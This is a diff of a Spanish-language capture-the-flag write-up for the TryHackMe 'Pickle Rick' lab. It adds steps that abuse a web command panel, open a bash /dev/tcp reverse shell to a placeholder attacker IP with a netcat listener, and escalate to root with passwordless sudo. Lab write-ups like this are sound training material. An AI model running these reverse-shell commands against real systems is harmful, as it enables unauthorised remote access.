@@ -58,7 +58,7 @@ La máquina **Pickle Rick** es una máquina virtual vulnerable de la plataforma 
   <img src="https://raw.githubusercontent.com/Wiinsad/winsad/master/assets/images/machines/THM/PickleRick/scan/PortServ.png">
   </p>
 
-  Ya que el escaneo de versiones y servicios no mostró demasiado empezamos a enumerar un poco mas a nivel web así que entre a la pagina ya que cuenta con un servicio **http** por el puerto 80, al entrar pude ver lo siguiente:
+  Ya que el escaneo de versiones y servicios no mostró demasiado empezamos a enumerar un poco mas a nivel web así que entre a la pagina ya que cuenta con un servicio **http** por el puerto **80** al entrar pude ver lo siguiente:
 
   <p align="center">
   <img src="https://raw.githubusercontent.com/Wiinsad/winsad/master/assets/images/machines/THM/PickleRick/scan/web.png">
@@ -70,34 +70,78 @@ La máquina **Pickle Rick** es una máquina virtual vulnerable de la plataforma 
   <img src="https://raw.githubusercontent.com/Wiinsad/winsad/master/assets/images/machines/THM/PickleRick/scan/pass.png">
   </p>
 
-  Ahora que tenemos un usuario el cual es **R1ckRul3s** podemos pensar que puede existir un loggin así que si hacemos enumeración web básica antes de emplear un fuzzing a nivel de rutas podemos probar con el recurso **Robots.txt**:
+  Ahora que tenemos un usuario el cual es **R1ckRul3s** podemos pensar que puede existir un login así que si hacemos enumeración web básica antes de emplear un fuzzing a nivel de rutas podemos probar con el recurso **Robots.txt**:
 
-  <p align="center">
-  <img src="https://raw.githubusercontent.com/Wiinsad/winsad/master/assets/images/machines/THM/PickleRick/scan/robots.png">
-  </p>
 
-  En este caso el recurso **Robots.txt** si estaba disponible, recordar que el recursos **Robots.txt** es un recursos que nos muestra rutas existentes a nivel de directorios en las paginas web, la mayoría de las paginas lo deshabilitado ya que es una buena practica en este caso no se deshabilitado y lo podemos usar para encontrar directorios o recursos sin necesidad de hacer fuerza bruta.
+  En este caso el recurso **Robots.txt** si estaba disponible, recordar que el recursos **Robots.txt** es un recursos que nos muestra rutas existentes a nivel de directorios en las paginas web, la mayoría de las paginas lo deshabilitado ya que es una buena practica en este caso no se deshabilitó y lo podemos usar para encontrar directorios o recursos sin necesidad de hacer fuerza bruta.
 
   <p align="center">
   <img src="https://raw.githubusercontent.com/Wiinsad/winsad/master/assets/images/machines/THM/PickleRick/scan/wubba.png">
   </p>
 
-  Vemos que tiene un recurso llamado **"Wubbalubbadubdub"** pero vemos que si entramos por la pagina web a este supuesto subdirectorio nos marca como error 404 el cual indica que no existe, ya que vimos esto intentamos buscar otras formas de encontrar rutas asi que si buscamos algo clasico como "login.php" puede y encontremos algo:
+  Vemos que tiene un recurso llamado **"Wubbalubbadubdub"** pero vemos que si entramos por la pagina web a este supuesto subdirectorio nos marca como error 404 el cual indica que no existe, ya que vimos esto intentamos buscar otras formas de encontrar rutas así que si buscamos algo clásico como "login.php" puede y encontremos algo:
 
   <p align="center">
   <img src="https://raw.githubusercontent.com/Wiinsad/winsad/master/assets/images/machines/THM/PickleRick/scan/log.png">
   </p>
 
-  Excelente ahora que tenemos un login podemos usar la credencial de usuario que encontramos en el codigo fuente y ya que lo que encontramos en Robots no fue un directorio lo usaremos como contraseña:
+  Excelente ahora que tenemos un login podemos usar la credencial de usuario que encontramos en el código fuente y ya que lo que encontramos en Robots no fue un directorio lo usaremos como contraseña:
 
   <p align="center">
   <img src="https://raw.githubusercontent.com/Wiinsad/winsad/master/assets/images/machines/THM/PickleRick/scan/webcmd.png">
   </p>
 
-  Super bien vemos que tenemos un panel el cual se llama "Command Panel" lo que es mas que obvio que es una gran pista, ingresamos un **"whoami"** y vemos que nos responde la maquina como el usuario **"www-data"**
+  ## Lateral Movement
+
+  Super bien vemos que tenemos un panel el cual se llama **"Command Panel"** lo que es mas que obvio que es una gran pista, ingresamos un **"whoami"** y vemos que nos responde la maquina como el usuario **"www-data"**
 
   <p align="center">
   <img src="https://raw.githubusercontent.com/Wiinsad/winsad/master/assets/images/machines/THM/PickleRick/scan/whoami.png">
   </p>
 
-  Asi que si vemos que tenemos ejecucion de comando pues entonces nos daremos una shell:
+  Así que si vemos que tenemos ejecución de comando pues entonces nos daremos una shell.
+  Para esto me pondré por el puerto 443 en escucha con el comando ```nc -nlvp 443``` y en la web pondré lo siguiente:
+
+  ```bash
+    /bin/bash -c 'bash -i >& /dev/tcp/[Your IP]/443 0>&1'
+  ```
+
+  <p align="center">
+  <img src="https://raw.githubusercontent.com/Wiinsad/winsad/master/assets/images/machines/THM/PickleRick/intrusion/shell1.png">
+  </p>
+
+  <p align="center">
+  <img src="https://raw.githubusercontent.com/Wiinsad/winsad/master/assets/images/machines/THM/PickleRick/intrusion/shell2.png">
+  </p>
+
+  Como vemos en nuestra consola ya tenemos acceso a la maquina y vemos que el mismo directorio se encuentra la primer flag y yendo a la ruta /home veo que hay dos usuarios, la carpeta de usuario **rick** se puede encontrar la segunda flag:
+
+  <p align="center">
+  <img src="https://raw.githubusercontent.com/Wiinsad/winsad/master/assets/images/machines/THM/PickleRick/intrusion/flag1.png">
+  </p>
+  <p align="center">
+  <img src="https://raw.githubusercontent.com/Wiinsad/winsad/master/assets/images/machines/THM/PickleRick/intrusion/flag2.png">
+  </p>
+
+  ## Privilege escalation
+
+  Ahora es momento de escalar privilegios para eso vemos si el usuario en el que actualmente estamos tiene algún permiso especial a nivel de **sudo** sin proporcionar contraseña eso lo vemos con el comando ```sudo -l```.
+
+  <p align="center">
+  <img src="https://raw.githubusercontent.com/Wiinsad/winsad/master/assets/images/machines/THM/PickleRick/intrusion/sudo.png">
+  </p>
+
+  Y sorprendentemente tenemos a nivel de **sudo** si proporcionar contraseña tenemos permisos absolutos así que podemos spawnearnos una shell con el siguiente comando:
+
+  ```bash
+  sudo /bin/bash
+  ```
+  Y como vemos ya somos root en la maquina a si que nos dirigimos al directorio de root y podemos visualizar la ultima flag y así concluyendo esta maquina.
+
+  <p align="center">
+  <img src="https://raw.githubusercontent.com/Wiinsad/winsad/master/assets/images/machines/THM/PickleRick/intrusion/root.png">
+  </p>
+
+  <p align="center">
+  <img src="https://raw.githubusercontent.com/Wiinsad/winsad/master/assets/images/machines/THM/PickleRick/intrusion/flag3.png">
+  </p>
